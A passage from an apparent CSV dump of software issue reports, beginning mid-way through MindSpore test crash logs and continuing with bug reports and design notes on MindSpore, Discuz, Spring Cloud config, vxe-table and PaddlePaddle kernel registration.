test_rmsprop_forward_input_shape_4d_epoch_3_lr_0001_centered_true_dtype_float32 File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/python.py"", line 167 in pytest_pyfunc_call File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/python.py"", line 1445 in runtest File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/runner.py"", line 134 in pytest_runtest_call File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/runner.py"", line 210 in &lt;lambda&gt; File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/runner.py"", line 237 in from_call File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/runner.py"", line 210 in call_runtest_hook File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/runner.py"", line 185 in call_and_report File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/runner.py"", line 99 in runtestprotocol File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/runner.py"", line 84 in pytest_runtest_protocol File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/main.py"", line 271 in pytest_runtestloop File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/main.py"", line 247 in _main File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/main.py"", line 197 in wrap_session File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/main.py"", line 240 in pytest_cmdline_main File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/config/__init__.py"", line 93 in main File ""/root/miniconda3/envs/ci3.7/bin/pytest"", line 8 in &lt;module&gt; Aborted (core dumped) [INFO] DEVICE(96702,7fc315ffb700,python):2021-07-08-17:37:42.376.555 [mindspore/ccsrc/runtime/device/cpu/cpu_device_address.cc:83] SyncHostToDevice] No need sync, host size: 0, device size: 0 [INFO] DEVICE(96702,7fc315ffb700,python):2021-07-08-17:37:42.376.581 [mindspore/ccsrc/runtime/device/cpu/cpu_device_address.cc:83] SyncHostToDevice] No need sync, host size: 0, device size: 0 Fatal Python error: Segmentation fault Thread 0x00007fcabca3e740 (most recent call first): File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/common/api.py"", line 622 in _exec_pip File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/common/api.py"", line 75 in wrapper File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/common/api.py"", line 639 in run File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/common/api.py"", line 611 in __call__ File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 659 in compile_and_run File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 385 in __call__ File ""/home/wangchunai/code0707/MindSporeTest/share/ops/primitive/tanh_ops.py"", line 48 in grad_mindspore_impl File ""/home/wangchunai/code0707/MindSporeTest/share/ops/primitive/tanh_ops.py"", line 67 in grad_cmp File ""/home/wangchunai/code0707/MindSporeTest/operations/test_tanh.py"", line 121 in test_tanh_input_0 File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/python.py"", line 167 in pytest_pyfunc_call File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/python.py"", line 1445 in runtest File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/runner.py"", line 134 in pytest_runtest_call File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/runner.py"", line 210 in &lt;lambda&gt; File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/runner.py"", line 237 in from_call File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/runner.py"", line 210 in call_runtest_hook File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/runner.py"", line 185 in call_and_report File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/runner.py"", line 99 in runtestprotocol File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/runner.py"", line 84 in pytest_runtest_protocol File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/main.py"", line 271 in pytest_runtestloop File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/main.py"", line 247 in _main File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/main.py"", line 197 in wrap_session File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/main.py"", line 240 in pytest_cmdline_main File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/config/__init__.py"", line 93 in main File ""/root/miniconda3/envs/ci3.7/bin/pytest"", line 8 in &lt;module&gt; Segmentation fault (core dumped) [INFO] DEVICE(60882,7f9afc249700,python):2021-07-08-17:39:27.696.663 [mindspore/ccsrc/runtime/hardware/cpu/cpu_memory_pool.cc:75] AllocDeviceMem] Current alloc size[1073741824], total used size[1073741824]. [ERROR] RUNTIME_FRAMEWORK(60882,7f9afe24d700,python):2021-07-08-17:39:27.715.288 [mindspore/ccsrc/runtime/framework/actor/switch_actor.cc:357] FetchInputDeviceTensor] 101_96_87_19_1_construct_wrapper.55:[CNode]42{[0]: ValueNode&lt;Primitive&gt; Switch, [1]: equiv[CNode]58, [2]: [CNode]42, [3]: [CNode]42} get device tensor store failed: Default/data-0, device type:2 [ERROR] RUNTIME_FRAMEWORK(60882,7f9afda4c700,python):2021-07-08-17:39:27.715.294 [mindspore/ccsrc/runtime/framework/actor/switch_actor.cc:357] FetchInputDeviceTensor] 101_96_87_19_1_construct_wrapper.55:[CNode]39{[0]: ValueNode&lt;Primitive&gt; Switch, [1]: equiv[CNode]58, [2]: [CNode]39, [3]: [CNode]39} get device tensor store failed: Default/data-0, device type:2 [ERROR] VM(60882,7f9cb94fb740,python):2021-07-08-17:39:27.715.382 [mindspore/ccsrc/vm/backend.cc:807] RunGraph] The actor runs failed, actor name: kernel_graph_0_1 [ERROR] DEBUG(60882,7f9cb94fb740,python):2021-07-08-17:39:27.715.418 [mindspore/ccsrc/debug/trace.cc:122] TraceGraphEval] Length of analysis graph stack is empty. [INFO] DEBUG(60882,7f9cb94fb740,python):2021-07-08-17:39:27.715.453 [mindspore/ccsrc/debug/trace.cc:505] GetEvalStackInfo] Get graph analysis information begin [ERROR] DEBUG(60882,7f9cb94fb740,python):2021-07-08-17:39:27.715.478 [mindspore/ccsrc/debug/trace.cc:508] GetEvalStackInfo] Length of analysis information stack is empty. terminate called after throwing an instance of 'std::future_error' what(): std::future_error: Promise already satisfied Fatal Python error: Aborted Thread 0x00007f9cb94fb740 (most recent call first): File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/common/api.py"", line 622 in _exec_pip File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/common/api.py"", line 75 in wrapper File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/common/api.py"", line 639 in run File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/common/api.py"", line 611 in __call__ File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 659 in compile_and_run File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 385 in __call__ File ""/home/wangchunai/code0707/MindSporeTest/side_effect_expression/test_side_effect_expression02.py"", line 410 in grad_mindspore_impl File ""/home/wangchunai/code0707/MindSporeTest/side_effect_expression/test_side_effect_expression02.py"", line 456 in test_side_effect_grad_two_addn_switch File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/python.py"", line 167 in pytest_pyfunc_call File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/callers.py"", line 208 in _multicall File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/python.py"", line 1445 in runtest File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/runner.py"", line 144 in pytest_runtest_call File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/callers.py"", line 208 in _multicall File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/runner.py"", line 210 in &lt;lambda&gt; File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/runner.py"", line 244 in from_call File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/runner.py"", line 210 in call_runtest_hook File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/runner.py"", line 187 in call_and_report File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/runner.py"", line 99 in runtestprotocol File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/runner.py"", line 84 in pytest_runtest_protocol File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/main.py"", line 271 in pytest_runtestloop File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/main.py"", line 247 in _main File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/main.py"", line 197 in wrap_session File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/main.py"", line 240 in pytest_cmdline_main File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/config/__init__.py"", line 93 in main File ""/root/miniconda3/envs/ci3.7/bin/pytest"", line 8 in &lt;module&gt; Aborted (core dumped) [INFO] RUNTIME_FRAMEWORK(6027,7f59dfed0700,python):2021-07-08-19:13:09.330.084 [mindspore/ccsrc/runtime/framework/actor/data_source_actor.cc:39] FetchData] Data source actor(kernel_graph_0_1_2_HostDSActor) fetches data. [ERROR] RUNTIME_FRAMEWORK(6027,7f59e06d1700,python):2021-07-08-19:13:09.330.108 [mindspore/ccsrc/runtime/framework/actor/data_source_actor.cc:245] OnMemoryAllocFinish] Host data queue is empty. [ERROR] RUNTIME_FRAMEWORK(6027,7f59e06d1700,python):2021-07-08-19:13:09.330.142 [mindspore/ccsrc/runtime/framework/actor/data_source_actor.cc:245] OnMemoryAllocFinish] Host data queue is empty. [INFO] RUNTIME_FRAMEWORK(6027,7f59e16d3700,python):2021-07-08-19:13:09.330.223 [mindspore/ccsrc/runtime/framework/actor/output_actor.cc:25] CreateOutputTensor] Create output tensor, output node: Default/relu-ReLU/ReLU-op20, output index: 0, output position: 0 terminate called after throwing an instance of 'std::future_error' what(): std::future_error: Promise already satisfied Fatal Python error: Aborted Thread 0x00007f5b06ca2740 (most recent call first): File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/common/api.py"", line 622 in _exec_pip File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/common/api.py"", line 75 in wrapper File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/common/api.py"", line 639 in run File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/common/api.py"", line 611 in __call__ File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 659 in compile_and_run File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 385 in __call__ File ""/home/wangchunai/code0707/MindSporeTest/parse/test_parser_construct_input_no_tensor01.py"", line 60 in forward_mindspore_impl File ""/home/wangchunai/code0707/MindSporeTest/parse/test_parser_construct_input_no_tensor01.py"", line 51 in __init__ File ""/home/wangchunai/code0707/MindSporeTest/parse/test_parser_tuple_index.py"", line 216 in test_parser_tuple_minus_index_004 File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/python.py"", line 167 in pytest_pyfunc_call File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/python.py"", line 1445 in runtest File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/runner.py"", line 134 in pytest_runtest_call File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/runner.py"", line 210 in &lt;lambda&gt; File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/runner.py"", line 237 in from_call File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/runner.py"", line 210 in call_runtest_hook File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/runner.py"", line 185 in call_and_report File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/runner.py"", line 99 in runtestprotocol File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/runner.py"", line 84 in pytest_runtest_protocol File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/main.py"", line 271 in pytest_runtestloop File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/main.py"", line 247 in _main File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/main.py"", line 197 in wrap_session File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/main.py"", line 240 in pytest_cmdline_main File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/config/__init__.py"", line 93 in main File ""/root/miniconda3/envs/ci3.7/bin/pytest"", line 8 in &lt;module&gt; Aborted (core dumped) [INFO] MD(109629,7f5eb8984740,python):2021-07-08-19:15:12.970.319 [mindspore/ccsrc/minddata/dataset/util/intrp_service.cc:26] ~IntrpService] Number of registered resources is 181. [INFO] ME(109629:140044800640832,MainProcess):2021-07-08-19:15:12.970.465 [/home/wangchunai/code0707/MindSporeTest/checkpoint/test_checkp"
"上传版块图标前端丢失alt标签恢复方法X3.4,X3.5都存在","\source\function\function_forumlist.php修改为：   <code>: $forum['icon'] = '&lt;a href=""forum.php?mod=forumdisplay&amp;fid='.$forum['fid'].'""&gt;&lt;img src=""'.$forum['icon'].'"" align=""left"" alt="""" /&gt;&lt;/a&gt;'; $forum['icon'] = '&lt;a href=""forum.php?mod=forumdisplay&amp;fid='.$forum['fid'].'""&gt;&lt;img src=""'.$forum['icon'].'"" align=""left"" alt=""'.$forum['name'].'"" /&gt;&lt;/a&gt;';"
[ST][MS][NET][GNMTV2][910 8p]RuntimeError: Current execute mode must launch process with OpenMPI,"GNMTV2网络在910环境执行8p训练脚本，网络启动失败 / 硬件环境: /device ascend : -- MindSpore version :r1.9 B090 commit_id:e2c61413 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : run包:HiAI/HISI_C83/20220922 MindSpore 版本:r1.9 B090 commit_id:e2c61413 (/): /mode graph test_ms_model_zoo_gnmtv2_check_fps_8p.py cd solution_test/remaining/test_scriptes/mindspore/net/GNMTv2/ python -m nose -s --nologcapture test_ms_model_zoo_gnmtv2_check_fps_8p.py 执行网络训练脚本成功，网络训练成功 走给王睿   <code>: Traceback (most recent call last): File ""train.py"", line 208, in &lt;module&gt; run_transformer_train() File ""/ms_test1/zjc/workspace/solution_test/remaining/test_scripts/mindspore/net/transformer/network/test_ms_model_zoo_transformer_perf_8p/run_distribute_train/helper0/src/model_utils/moxing_adapter.py"", line 108, in wrapped_func run_func(*args, **kwargs) File ""train.py"", line 204, in run_transformer_train model.train(config.epoch_size, dataset, callbacks=callbacks, dataset_sink_mode=False) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 1050, in train initial_epoch=initial_epoch) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 98, in wrapper func(self, *args, **kwargs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 617, in _train self._train_process(epoch, train_dataset, list_callback, cb_params, initial_epoch, valid_infos) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 908, in _train_process outputs = self._train_network(*next_element) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 591, in __call__ out = self.compile_and_run(*args) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 979, in compile_and_run self.compile(*inputs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 951, in compile jit_config_dict=self._jit_config_dict) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/common/api.py"", line 1159, in compile result = self._graph_executor.compile(obj, args_list, phase, self._use_vm_mode()) RuntimeError: Current execute mode must launch process with OpenMPI ---------------------------------------------------- - C++ Call Stack: (For framework developers) ---------------------------------------------------- mindspore/ccsrc/pipeline/jit/action.cc:1203 SetRunMode"
配置中心仓库文件无法找到,你好，在配置中心，paascloud-config-repo这个仓库无法找到啊 感谢作者   <code>: spring: cloud: config: server: git: uri: https://git.oschina.net/passcloud/paascloud-config-repo username: password: search-paths: /* # '{application}'
mindspore.dataset.text.transforms模块，windows平台不支持的分词器，报错信息不够准确,"<ol start=""0""> 【环境信息】：windows10 + CPU + mindspore1.7版本 【Document Link】/【文档链接】 https://www.mindspore.cn/docs/zh-CN/r1.7/api_python/mindspore.dataset.text.html 【Issues Section】/【问题文档片段】 Windows平台上不支持 BasicTokenizer等分词器，但是mindspore报错信息不准确，具体如下： 报错信息如下： <ol start=""3""> 【Existing Issues】/【存在的问题】 报错信息不够清楚，不能够准确说明问题的原因（BasicTokenizer等分词器仅仅是windows+cpu平台不支持，而不是module 'mindspore.dataset.text' has no attribute 'BasicTokenizer'）。 【Expected Result】【预期结果】 window+cpu平台不支持 BasicTokenizer等分词器，提示的日志信息建议为：“BasicTokenizer not be supported on windows（cpu）now”   <code>: from mindspore.dataset.text import NormalizeForm import mindspore.dataset.text as text # If with_offsets=False, default output one column {[""text"", dtype=str]} tokenizer_op = text.BasicTokenizer(lower_case=False, keep_whitespace=False, normalization_form=NormalizeForm.NONE, preserve_unused_token=True, with_offsets=False) Traceback (most recent call last): File ""text_icu4c.py"", line 6, in &lt;module&gt; tokenizer_op = text.BasicTokenizer(lower_case=False, AttributeError: module 'mindspore.dataset.text' has no attribute 'BasicTokenizer'"
vxe-input type=‘float’ 时，数据转换出现问题，请及时修复，主要原因是调用 XEUtils.floor()方法有bug，详见说明,"vxe-input type=‘float’ 时，数据转换出现问题，请及时修复，主要原因是调用 XEUtils.floor()方法有bug，输入-0.999时，返回的值为-1，这个是明显的错误。我看了源代码，内部调用的逻辑应该是这样的： 请填重在线链接： vxe-input type=‘float’ 时，数据转换出现问题，请及时修复，主要原因是调用 XEUtils.floor()方法有bug，输入-0.999时，返回的值为-1，这个是明显的错误！或者加个属性，灵活控制一下！ 请填写期望的结果： 输入-0.999 时，返回：-0.99 OS: Browser: vue: 3 vxe-table: 4.14   <code>: let tempNumber:number = input.value ; if(temp&lt;0){ tempNumber = XEUtils.toFixed(XEUtils.ceil(temp,2),2); }else{ tempNumber = XEUtils.toFixed(XEUtils.floor(temp,2),2); }"
need to refine our design of OpKernelType,"An operator can have different kernel implementations. Fluid uses to identify a unique Kernel. Currently, is defined as follows: https://github.com/PaddlePaddle/Paddle/blob/2d5ec16bc8a09fb8e0f62c89b116b0cd1d333907/paddle/framework/operator.h#L348-L374 It contains two keys, and . However, these two keys are not enough. We need a more complete representation of . There are four keys to determine a kernel type of an operator: ///. We often implement a kernel of an operator with some computing library in certain device. Please remind that computing library and device are not one-to-one corresponding. A device can have a lot of computing libraries and a computing library can also support several devices. For example, Eigen library can support Nvidia GPU/AMD GPU/CPU. And MKLDNN library can support Intel CPU/Intel FPGA. So, both and should be a key of . Another two keys are and . It's obvious that different DataTypes, like fp64/fp32/int8 will have different kernels. And please refer to #6765:fix latex equation in fluid fc layer. to get the details about .   <code>: OpKernelType OpKernelType Place DataType OpKernelType Place Library DataType Layout Place Library OpKernelType DataType Layout Layout"
multiple data type support,"The kernel register macro need to support multiple data types, not only in CPU operators but also in GPU operators. Our register need to duplicate the same macro many times, which should be improved soon. For example, can be simplifid into format of (just pseudo code)   <code>: REGISTER_OP_CPU_KERNEL( elementwise_sub_grad, ops::ElementwiseSubGradKernel&lt;paddle::platform::CPUPlace, float&gt;, ops::ElementwiseSubGradKernel&lt;paddle::platform::CPUPlace, double&gt;, ops::ElementwiseSubGradKernel&lt;paddle::platform::CPUPlace, int&gt;, ops::ElementwiseSubGradKernel&lt;paddle::platform::CPUPlace, int64_t&gt;); using NumricTypes = TensorTypes&lt;int, int64_t, float, double&gt;; REGISTER_OP_CPU_KERNEL( elementwise_sub_grad, ops::ElementwiseSubGradKernel&lt;paddle::platform::CPUPlace&gt;, NumricTypes)"
